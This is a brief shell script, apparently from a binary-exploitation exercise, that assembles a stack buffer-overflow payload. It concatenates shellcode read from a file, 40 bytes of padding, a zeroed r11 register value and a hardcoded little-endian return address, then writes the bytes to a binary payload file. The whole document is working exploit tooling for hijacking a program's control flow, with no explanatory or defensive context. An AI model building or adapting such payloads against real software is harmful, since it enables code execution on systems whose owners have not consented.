## Payload Creation Script

# change return address
ret_addr=0x7efffc60
shellcode="res/shellcode.txt"

pad=$(for i in $(seq 40); do echo -n '42'; done)
r11=$(printf %08x 0x0 | tac -rs..)
ret=$(printf %08x $ret_addr | tac -rs..) # little endian

(cat $shellcode; echo -n $pad; echo -n $r11; echo -n $ret) | xxd -r -p > "out/payload.bin"